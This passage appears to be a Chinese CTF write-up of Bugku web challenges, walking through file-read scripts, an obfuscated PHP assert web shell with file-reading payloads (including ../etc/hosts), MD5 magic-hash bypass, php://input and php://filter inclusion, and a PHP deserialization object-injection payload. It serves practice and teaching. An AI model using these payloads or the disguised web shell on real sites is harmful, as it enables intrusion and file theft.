+<p><img src="https://s1.ax1x.com/2018/12/17/F0te2j.png" alt="F0te2j.png"><br><img src="https://s1.ax1x.com/2018/12/17/F0tKrq.png" alt="F0tKrq.png"><br><img src="https://s1.ax1x.com/2018/12/17/F0tMq0.png" alt="F0tMq0.png"><br><img src="https://s1.ax1x.com/2018/12/17/F0t1aT.png" alt="F0t1aT.png"><br><img src="https://s1.ax1x.com/2018/12/17/F0t3IU.png" alt="F0t3IU.png"></p>
+<h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h3><p><img src="https://s1.ax1x.com/2018/12/17/F0tJG4.png" alt="F0tJG4.png"><br>URL上有段base64，解密后的信息是”keys.txt”</p>
+<p><img src="https://s1.ax1x.com/2018/12/17/F0tdqx.png" alt="F0tdqx.png"><br>参数line是按行返回信息</p>
+<p>从keys.txt可以看出，”filename=”后面直接加的是文件名的base64编码</p>
+<p>猜测index.php文件是否存在，把index.php转成base64：aW5kZXgucGhw<br>填入url，<br>payload：<a target="_blank" rel="noopener" href="http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw">http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw</a></p>
+<p>查看源码，有信息<br><img src="https://s1.ax1x.com/2018/12/17/F0tBdK.png" alt="F0tBdK.png"></p>
+<p>把line改成line=3试试，有信息<br><img src="https://s1.ax1x.com/2018/12/17/F0tDIO.png" alt="F0tDIO.png"></p>
+<p>写一个脚本，获得index.php中的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">re=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://123.206.87.240:8002/web11/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">    key=&#123;<span class="string">&#x27;line&#x27;</span>:str(i),<span class="string">&#x27;filename&#x27;</span>:<span class="string">&#x27;aW5kZXgucGhw&#x27;</span>&#125;</span><br><span class="line">    a=re.get(url,params=key).content</span><br><span class="line">    code=str(a,encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure>
+
+<p>拿到index.php的源码<br><img src="https://s1.ax1x.com/2018/12/17/F0tyJe.png" alt="F0tyJe.png"></p>
+<p>可以看到，cookie的名字和值都是”margin”<br><img src="https://s1.ax1x.com/2018/12/17/F0t6RH.png" alt="F0t6RH.png"></p>
+<p>修改cookie：margin=margin  ,修改filename的值为keys.php的base64编码，访问keys.php(图中标1处，即为keys.php的base64编码)<br><img src="https://s1.ax1x.com/2018/12/17/F0tczd.png" alt="F0tczd.png"></p>
+<h3 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h3><p>查看源码，要post一个margin<br><img src="https://s1.ax1x.com/2018/12/17/F0theP.png" alt="F0theP.png"></p>
+<p>bp抓包，<br><img src="https://s1.ax1x.com/2018/12/17/F0t5o8.png" alt="F0t5o8.png"></p>
+<p>Base64解码之后，又一个base64，再解码<br><img src="https://s1.ax1x.com/2018/12/17/F0t7WQ.png" alt="F0t7WQ.png"></p>
+<p>得到几个数字，没什么用啊<br><img src="https://s1.ax1x.com/2018/12/17/F0tHzj.png" alt="F0tHzj.png"></p>
+<p>bp又抓了一次，发现flag居然变了，又进行了解码，也没用<br><img src="https://s1.ax1x.com/2018/12/17/F0tqQs.png" alt="F0tqQs.png"></p>
+<p>看了大佬的wp，使用脚本做的，学习一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://123.206.87.240:8002/web6/&quot;</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=r.get(url).headers<span class="comment">#因为flag在消息头里</span></span><br><span class="line"></span><br><span class="line">mid=base64.b64decode(headers[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line"></span><br><span class="line">mid=mid.decode()<span class="comment">#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(mid.split(<span class="string">&#x27;:&#x27;</span>)[1])<span class="comment">#获得flag:后的值</span></span><br><span class="line">data=&#123;<span class="string">&#x27;margin&#x27;</span>:flag&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (r.post(url,data).text)<span class="comment">#post方法传上去</span></span><br></pre></td></tr></table></figure>
+<p>拿到flag<br><img src="https://s1.ax1x.com/2018/12/17/F0tvwV.png" alt="F0tvwV.png"></p>
+<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>题目给的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; </span><br><span class="line">	<span class="variable">$poc_1</span>=explode(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line">	<span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; 	<span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>explode()函数可以在官方文档看详细信息，就是把字符串打散成数组。</p>
+<p>exlpde()分割a#s#s#e#r#t为assert，使用assert()函数的解析传进来的s串，那就说明可以执行代码。</p>
+<p>payload:</p>
+<blockquote>
+<p>s=print_r(scandir(‘./‘)) 然后读取fl4g.txt   </p>
+<p>s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)**</p>
+<p>使用file_get_contents(“flag.txt”)读取文件**</p>
+</blockquote>
+<p>读取文件还可以使用readfile()和fopen(),可以任意读取文件。</p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?s=print_r(readfile(<span class="string">&#x27;../etc/hosts&#x27;</span>))</span><br><span class="line">?s=print_r(fopen(<span class="string">&#x27;../etc/hosts&#x27;</span>,<span class="string">&#x27;r&#x27;</span>))</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h4><p>题目提示是MD5碰撞，开始试了几个a=1之类的，都报是false，猜测应该是要输入的这个值，MD5之后是以0e开头的字符串，因为，PHP在处理哈希字符串时，会利用!=或==来对哈希值进行比较，它把每一个以0e开头的哈希值都解释为0</p>
+<p>payload：<code>?a=s155964671a</code></p>
+<h4 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h4><p>打开题目，看看源码，发现一个1.html，查看源码，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">&quot;Javascript&quot;</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="comment">&lt;!--</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars"></span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars"></span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">var Words =&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; </span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">function OutWord()</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">var NewWords;</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">NewWords = unescape(Words);</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">document.write(NewWords);</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">&#125; </span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">OutWord();</span></span></span></span><br><span class="line"><span class="comment"><span class="xml"><span class="handlebars">// --&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到中间有一大段base64加密的串，还混这url，base64解密之后，是一段url编码，和一些语句，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure>
+
+<p>再次url解码之后，得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">&#x27;Location: hello.php?id=1&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;no no no no no no no&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @file_get_contents(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;bugku is a nice plateform!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span>==<span class="number">0</span> <span class="keyword">and</span> strlen(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">&quot;111&quot;</span>.substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> substr(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;f4l2a3g.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;never never never give up !!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>if(stripos($a,’.’))</p>
+<p>if($data==”bugku is a nice plateform!” and $id==0 and strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4)</p>
+</blockquote>
+<p>要求a中不能有字符，id不能是空，且id=0，data=”bugku is a nice plateform!”，id=0，b的长度&gt;5，”111”拼接上b的第一个字符=“1114”，但是b的低一个字符有不能=4，这样才可以包含f412a3g.txt</p>
+<p>我们一点点来分析，</p>
+<p>PHP在处理数字与字符串的结合是会把第一个数字当做整个串的值，比如”<code>1asd</code>“=1，那么我们只要使id的值，是一个字符串，就可以使id弱等于0，</p>
+<p>源码中变量 <code>$data</code> 是由 <code>file_get_contents()</code>读取的 ，file_get_contents() 函数是用于将文件的内容读入到一个字符串中的方法，函数读取变量 <code>$a</code> 的值而得，所以 <code>$a</code> 的值必须为数据流。</p>
+<p>我们不可能创建一个a文件，再写入数据bugku is a nice plateform!。</p>
+<p>那么，要让a=bugku is a nice plateform!，只能利用，用php伪协议 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.php.php">php://</a> 来访问输入输出的数据流，它的大概意思就是可以读取我们post传递的只读数据流。所以，令 <code>$a = &quot;php://input&quot;</code>，并post提交字符串 <code>bugku is a nice plateform!</code>。</p>
+<p>而对于eregi(“111”.substr($b,0,1),”1114”)，很简单，直接用%00绕过，可以使b=%0012345</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/AL4QYD.png" alt="AL4QYD.png"></p>
+<p>成得到flag。还有一个方法是，直接读取f4l2a3g.txt</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/AL4JOI.png" alt="AL4JOI.png"></p>
+<p>也可以得到flag。</p>
+<h4 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h4><p>查看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$pass</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user</span>)&amp;&amp;(file_get_contents(<span class="variable">$user</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello admin!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not admin ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>有个hint.php，访问试试，什么都没有，不死心，再<code>?file=php://filter/read=convert.base64-encode/resource=hint.php</code>读一下，什么都没有，，，，，，</p>
+<p>还是看源码吧</p>
+<p><code>file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;</code>，意思是把名为$user文件的内容输出到一个字符串，并且要求这个字符串是”welcome to the bugkuctf”，</p>
+<p>这里可以使用php://伪协议，让user=php://，然后post提交welcome to the bugkuctf，这样就可以使语句变成<code>file_get_contents(php://,&#39;r&#39;)</code></p>
+<p>payload ：GET：<code>?txt=php://input</code>     POST：<code>welcome to the bugkuctf</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALI0Mj.png" alt="ALI0Mj.png"></p>
+<p>页面变了，但是为啥不是hello admin呢？</p>
+<p>而且，flag在哪呢。。。。。。。</p>
+<p>突然想到hint.php，再读一次<code>file=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
+<p>payload：<code>?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code></p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALoUTx.png" alt="ALoUTx.png"></p>
+<p>有东西啊，拿去解码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>     <span class="comment">//hint.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php    </span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;        </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;           </span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;good&quot;</span>);     </span><br><span class="line">    &#125;      &#125;  &#125;  <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>得到了源码，可以然并卵啊，，，百思不得其解，最后，百度了一下，发现php://filter读取index.php，居然把这个给忘了，，读吧，</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALTdDs.png" alt="ALTdDs.png"></p>
+<p>再base64解码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      <span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$txt</span> = <span class="variable">$_GET</span>[<span class="string">&quot;txt&quot;</span>];  </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];  </span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$txt</span>)&amp;&amp;(file_get_contents(<span class="variable">$txt</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the bugkuctf&quot;</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello friend!&lt;br&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你们flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are not the number of bugku ! &quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>if(preg_match(“/flag/“,$file))    //说明文件名不能含有flag</p>
+</blockquote>
+<blockquote>
+<p>$password = unserialize($password);</p>
+</blockquote>
+<p> 第一句，说明文件名$file不能含有flag，</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/AL7ydI.png" alt="AL7ydI.png"></p>
+<p>而这段代码中，有一个__tostring()方法，双下划线的魔术方法，当Flag类被实例化的时候会自动执行__tostring方法，而这个方法中写了如果file文件存在，那么就输出file文件中的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;不能现在就给你们flag哦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>如果文件名没有”flag”了，就会把这个文件包含进来,然后$password进行反序列化，再输出$password的值。</p>
+<p>所以我们要构造一个Flag类型的参数，并把这个参数传给password。</p>
+<p>但是password被unserialize()反序列化处理，所以要先serialize()序列化，关于序列化与反序列化，可以查看我的另一篇文章，PHP序列化与反序列化</p>
+<p>直接<a target="_blank" rel="noopener" href="https://tool.lu/coderunner/">PHP代码在线执行</a></p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALHcnJ.png" alt="ALHcnJ.png"></p>
+<p>然后把 <code>password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>get提交</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/ALHTje"><img src="https://s2.ax1x.com/2019/04/13/ALHTje.png" alt="ALHTje.png"></a></p>
+<p>终于拿到flag了</p>
+<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= preg_match(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>原文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30464257/article/details/81160656">https://blog.csdn.net/qq_30464257/article/details/81160656</a> </p>
+<p>关键的还是看preg_match中的内容嘛，这里简单讲一下、需要用到的规则</p>
+<pre><code>1.表达式直接写出来的字符串直接利用，如key
+2.“.”代表任意字符
+3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次
+4.“\/”代表“/”
+5.[a-z]代表a-z中的任意一个字符
+6.[[:punct:]]代表任意一个字符，包括各种符号
+7./i代表大小写不敏感
+8.&#123;4-7&#125;代表[0-9]中数字连续出现的次数是4-7次
+</code></pre>
+<p>payload：<code>?id=keyaaakeyaaaakey:/a/aakeya@</code></p>
+<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>打开题目，就一句话</p>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALL27j.png" alt="ALL27j.png"></p>
+<p>换Google浏览器试了一下，发现还是不行，那么只能修改header了</p>
+<blockquote>
+<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/04/13/ALLocT.png" alt="ALLocT.png"></p>
